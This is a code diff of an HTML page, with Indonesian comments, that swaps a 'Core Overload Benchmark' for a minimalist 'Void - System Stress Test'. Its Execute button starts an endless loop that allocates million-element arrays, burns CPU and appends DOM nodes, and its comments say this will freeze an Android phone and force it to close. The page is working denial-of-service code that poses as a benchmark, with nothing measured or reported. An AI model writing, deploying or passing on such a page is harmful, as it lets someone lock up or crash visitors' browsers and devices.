@@ -3,359 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS - Core Overload Benchmark</title>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <title>Void - System Stress Test</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
+        /* Desain Minimalis, Elegan, dan Bersih */
         :root {
-            --theme: #00f0ff;
-            --bg: #050508;
-            --danger: #ff003c;
+            --bg: #030303;
+            --text: #ffffff;
+            --accent: #ff2a2a;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Share Tech Mono', monospace;
+            font-family: 'Inter', sans-serif;
             user-select: none;
         }
 
         body {
             background-color: var(--bg);
-            color: var(--theme);
-            overflow: hidden;
+            color: var(--text);
             height: 100vh;
             width: 100vw;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
+            overflow: hidden;
+            transition: background-color 0.8s ease;
         }
 
-        /* Canvas for GPU Rendering */
-        #core-canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-        }
-
-        /* Cyberpunk UI Overlay */
-        .hud-overlay {
-            position: relative;
+        .container {
+            text-align: center;
             z-index: 10;
-            width: 90%;
-            max-width: 600px;
-            border: 1px solid rgba(0, 240, 255, 0.3);
-            background: linear-gradient(135deg, rgba(5,5,8,0.9) 0%, rgba(0,20,30,0.8) 100%);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.1), inset 0 0 20px rgba(0, 240, 255, 0.05);
-            padding: 30px;
-            backdrop-filter: blur(10px);
-            clip-path: polygon(0 0, 100% 0, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0 100%);
-            transition: all 0.5s ease;
-        }
-
-        /* Glitch Title */
-        .title {
-            font-size: 24px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--theme);
-            padding-bottom: 10px;
-            position: relative;
-        }
-
-        .title::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            right: 0;
-            width: 50%;
-            height: 3px;
-            background: var(--theme);
-        }
-
-        /* Terminal Data Stream */
-        .terminal {
-            height: 120px;
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(0, 240, 255, 0.2);
-            padding: 10px;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.7);
-            overflow-y: hidden;
             display: flex;
             flex-direction: column;
-            justify-content: flex-end;
-            margin-bottom: 20px;
+            align-items: center;
         }
 
-        .log-line {
-            margin: 2px 0;
-            opacity: 0.8;
-            animation: fadeIn 0.2s ease-in;
-        }
-
-        /* Stats Grid */
-        .stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-
-        .stat-box {
-            background: rgba(0, 240, 255, 0.05);
-            border-left: 3px solid var(--theme);
-            padding: 10px;
-        }
-
-        .stat-label { font-size: 10px; color: #888; text-transform: uppercase; }
-        .stat-value { font-size: 22px; font-weight: bold; color: #fff; }
-
-        /* Initiate Button */
-        .btn-initiate {
-            width: 100%;
-            padding: 15px;
-            background: transparent;
-            color: var(--theme);
-            border: 1px solid var(--theme);
-            font-size: 18px;
-            font-weight: bold;
+        /* Tipografi Elegan */
+        h1 {
+            font-weight: 300;
+            letter-spacing: 12px;
+            font-size: 1.2rem;
+            color: #888;
             text-transform: uppercase;
-            letter-spacing: 4px;
+            margin-bottom: 3rem;
+            transition: 0.3s;
+        }
+
+        /* Tombol Eksekusi Minimalis */
+        .btn-kill {
+            background: transparent;
+            color: var(--text);
+            border: 1px solid #333;
+            padding: 18px 50px;
+            font-size: 0.9rem;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            border-radius: 2px;
             cursor: pointer;
+            transition: all 0.4s ease;
             position: relative;
             overflow: hidden;
-            transition: 0.3s;
-            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
         }
 
-        .btn-initiate:hover {
-            background: var(--theme);
-            color: var(--bg);
-            box-shadow: 0 0 20px var(--theme);
+        .btn-kill::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--accent);
+            z-index: -1;
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform 0.4s ease;
         }
 
-        /* State: MELTDOWN (Changes everything to red) */
-        body.meltdown {
-            --theme: #ff003c;
-            animation: screenShake 0.5s infinite;
+        .btn-kill:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 30px rgba(255, 42, 42, 0.2);
         }
 
-        body.meltdown .btn-initiate {
-            background: var(--theme);
-            color: #fff;
+        .btn-kill:hover::before {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        .status {
+            margin-top: 2rem;
+            font-size: 0.7rem;
+            letter-spacing: 3px;
+            color: #444;
+        }
+
+        /* Mode Kematian (Death Sequence) */
+        body.death-sequence {
+            background-color: #0a0000;
+            animation: glitch-bg 0.1s infinite;
+        }
+
+        body.death-sequence h1 {
+            color: var(--accent);
+            letter-spacing: 15px;
+            font-weight: 700;
+        }
+
+        body.death-sequence .btn-kill {
+            opacity: 0;
             pointer-events: none;
-            animation: pulseBg 0.2s infinite;
         }
 
-        /* Animations */
-        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 0.8; transform: translateX(0); } }
-        @keyframes screenShake {
-            0% { transform: translate(1px, 1px) rotate(0deg); }
-            10% { transform: translate(-1px, -2px) rotate(-1deg); }
-            20% { transform: translate(-3px, 0px) rotate(1deg); }
-            30% { transform: translate(3px, 2px) rotate(0deg); }
-            40% { transform: translate(1px, -1px) rotate(1deg); }
-            50% { transform: translate(-1px, 2px) rotate(-1deg); }
-            60% { transform: translate(-3px, 1px) rotate(0deg); }
-            70% { transform: translate(3px, 1px) rotate(-1deg); }
-            80% { transform: translate(-1px, -1px) rotate(1deg); }
-            90% { transform: translate(1px, 2px) rotate(0deg); }
-            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        /* Efek Glitch Visual GPU Stress */
+        .gpu-killer {
+            position: absolute;
+            width: 100vw;
+            height: 50vh;
+            background: rgba(255, 0, 0, 0.1);
+            backdrop-filter: blur(20px) contrast(200%); /* Efek paling berat untuk GPU Mobile */
+            mix-blend-mode: overlay;
+            z-index: 5;
+            pointer-events: none;
         }
-        @keyframes pulseBg { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
 
+        @keyframes glitch-bg {
+            0% { filter: invert(0) hue-rotate(0deg); }
+            50% { filter: invert(1) hue-rotate(90deg); transform: translate(2px, -2px); }
+            100% { filter: invert(0) hue-rotate(0deg); }
+        }
     </style>
 </head>
 <body>
 
-    <!-- Particle GPU Engine -->
-    <canvas id="core-canvas"></canvas>
-
-    <!-- HUD Interface -->
-    <div class="hud-overlay" id="hud">
-        <div class="title">SYS.CORE // BENCHMARK</div>
-        
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-label">Frame Rate (FPS)</div>
-                <div class="stat-value" id="fps-counter">60.0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Rendered Entities</div>
-                <div class="stat-value" id="entity-counter">150</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">CPU Threads</div>
-                <div class="stat-value" id="cpu-counter">IDLE</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">RAM Allocated</div>
-                <div class="stat-value" id="ram-counter">12 MB</div>
-            </div>
-        </div>
-
-        <div class="terminal" id="terminal">
-            <div class="log-line">> SYSTEM READY.</div>
-            <div class="log-line">> WAITING FOR STRESS INITIATION...</div>
-        </div>
-
-        <button class="btn-initiate" id="start-btn" onclick="initiateMeltdown()">INITIATE STRESS TEST</button>
+    <div class="container">
+        <h1 id="title">System Integrity 100%</h1>
+        <button class="btn-kill" id="executeBtn" onclick="startAssassination()">Execute</button>
+        <div class="status" id="status-text">DEVICE STATUS: OPTIMAL</div>
     </div>
 
     <script>
-        // --- VISUAL ENGINE (GPU STRESS) ---
-        const canvas = document.getElementById('core-canvas');
-        const ctx = canvas.getContext('2d');
-        let width, height;
-        let particles = [];
-        let isMeltdown = false;
+        let isDead = false;
+        let memoryBlackhole = []; // Array penampung RAM leak
 
-        function resize() {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-        }
-        window.addEventListener('resize', resize);
-        resize();
+        function startAssassination() {
+            if (isDead) return;
+            isDead = true;
 
-        class Particle {
-            constructor() {
-                this.x = width / 2;
-                this.y = height / 2;
-                this.angle = Math.random() * Math.PI * 2;
-                this.speed = Math.random() * 2 + 0.5;
-                this.radius = Math.random() * 2 + 1;
-                this.color = isMeltdown ? `rgba(255, 0, 60, ${Math.random()})` : `rgba(0, 240, 255, ${Math.random()})`;
+            // 1. Ubah UI menjadi mengerikan secara instan
+            document.body.classList.add('death-sequence');
+            document.getElementById('title').innerText = "FATAL SEQUENCE";
+            document.getElementById('status-text').innerText = "MEMORY CORRUPTION INITIATED...";
+            document.getElementById('status-text').style.color = "#ff2a2a";
+
+            // 2. Suntik elemen perusak GPU ke layar
+            for (let i = 0; i < 50; i++) {
+                let gpuStress = document.createElement('div');
+                gpuStress.className = 'gpu-killer';
+                gpuStress.style.top = (Math.random() * 100) + 'vh';
+                gpuStress.style.transform = `rotate(${Math.random() * 360}deg)`;
+                document.body.appendChild(gpuStress);
             }
-            update() {
-                this.x += Math.cos(this.angle) * this.speed;
-                this.y += Math.sin(this.angle) * this.speed;
-                // If it goes off screen, reset to center
-                if(this.x < 0 || this.x > width || this.y < 0 || this.y > height) {
-                    this.x = width / 2;
-                    this.y = height / 2;
-                }
-            }
-            draw() {
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
-                ctx.fillStyle = this.color;
-                ctx.fill();
-            }
-        }
 
-        // Setup initial chill particles
-        for(let i = 0; i < 150; i++) particles.push(new Particle());
-
-        // FPS Calculation
-        let lastTime = performance.now();
-        let frames = 0;
-        let fps = 60;
-
-        function render() {
-            ctx.fillStyle = isMeltdown ? 'rgba(5, 0, 2, 0.1)' : 'rgba(5, 5, 8, 0.2)';
-            ctx.fillRect(0, 0, width, height);
-
-            ctx.globalCompositeOperation = 'lighter';
-            particles.forEach(p => {
-                p.update();
-                p.draw();
-            });
-            ctx.globalCompositeOperation = 'source-over';
-
-            // Calculate FPS
-            const now = performance.now();
-            frames++;
-            if (now - lastTime >= 1000) {
-                fps = frames;
-                frames = 0;
-                lastTime = now;
-                document.getElementById('fps-counter').innerText = fps;
+            // Beri jeda 800 milidetik agar user melihat perubahan layar merah,
+            // setelah itu eksekusi sistem secara brutal.
+            setTimeout(() => {
                 
-                if (isMeltdown) {
-                    logTerminal(`WARN: FPS DROPPED TO ${fps}`);
-                }
-            }
-
-            requestAnimationFrame(render);
-        }
-        render();
-
-        // --- TERMINAL LOGIC ---
-        const terminal = document.getElementById('terminal');
-        function logTerminal(msg) {
-            const line = document.createElement('div');
-            line.className = 'log-line';
-            line.innerText = `> ${msg}`;
-            terminal.appendChild(line);
-            if (terminal.children.length > 6) terminal.removeChild(terminal.firstChild);
-        }
-
-        // --- THE KILL SWITCH (RAM + CPU OVERLOAD) ---
-        // This array will hold massive amounts of junk data until the RAM bursts
-        let memoryLeak = []; 
-        let ramUsage = 12;
-
-        function initiateMeltdown() {
-            if (isMeltdown) return;
-            isMeltdown = true;
-
-            // UI Changes
-            document.body.classList.add('meltdown');
-            document.getElementById('start-btn').innerText = "FATAL OVERLOAD IN PROGRESS";
-            document.getElementById('cpu-counter').innerText = "MAX LOCKED";
-            
-            logTerminal("INITIATING CORE OVERLOAD...");
-            logTerminal("INJECTING MEMORY LEAK...");
-
-            // 1. GPU OVERLOAD: Spawn 20,000 particles at once
-            for(let i = 0; i < 20000; i++) {
-                particles.push(new Particle());
-            }
-            document.getElementById('entity-counter').innerText = particles.length.toLocaleString();
-
-            // 2. RAM & CPU ASSASSINATION INTERVAL
-            let stressLevel = 0;
-            
-            const killerInterval = setInterval(() => {
-                stressLevel++;
+                // INI ADALAH KODE PEMBUNUHNYA
+                // While loop (tanpa henti) akan mengunci total HP, layar tidak akan bisa disentuh.
+                // Di dalam loop, kita menimbun array jutaan angka ke dalam RAM.
                 
-                // CPU BURN: Heavy synchronous mathematical loops
-                let garbageMath = 0;
-                for (let i = 0; i < 100000; i++) {
-                    garbageMath += Math.sqrt(Math.random() * 99999) * Math.tan(Math.random());
-                }
+                while (true) {
+                    try {
+                        // RAM OVERLOAD: Membuat array isi 1 juta data random terus menerus
+                        // Ini akan membuat RAM Android penuh dalam hitungan 1-3 detik.
+                        memoryBlackhole.push(new Array(1000000).fill(Math.random()));
+                        
+                        // CPU BURN: Memaksa CPU menghitung angka berat bersamaan
+                        Math.sqrt(Math.random() * 999999) * Math.tan(Math.random());
+                        
+                        // GPU OVERLOAD: Menambah elemen DOM tiada henti
+                        let div = document.createElement('div');
+                        document.body.appendChild(div);
 
-                // RAM LEAK: Push gigantic arrays into memory (Approx 5MB - 10MB per tick)
-                // When RAM is full, Android OS will immediately Force Close the app
-                try {
-                    const junkData = new Array(1000000).fill("OVERLOAD_" + Math.random());
-                    memoryLeak.push(junkData);
-                    
-                    ramUsage += 15; // Fake tracker based on array size
-                    document.getElementById('ram-counter').innerText = ramUsage + " MB";
-                    
-                    if(stressLevel % 5 === 0) {
-                        logTerminal(`CRITICAL: MEMORY INFLATED +${ramUsage}MB`);
+                    } catch (e) {
+                        // Jika masuk kesini berarti RAM sudah jebol (Out of Memory)
+                        // OS Android akan langsung melakukan Force Close.
                     }
-                } catch (e) {
-                    // If it errors out, the browser is about to crash
-                    logTerminal("FATAL ERROR: MEMORY LIMIT REACHED");
                 }
-
-                // Add even MORE particles exponentially
-                if (particles.length < 100000) {
-                    for(let i = 0; i < 5000; i++) particles.push(new Particle());
-                    document.getElementById('entity-counter').innerText = particles.length.toLocaleString();
-                }
-
-            }, 50); // Runs every 50 milliseconds
+                
+            }, 800);
         }
     </script>
 </body>
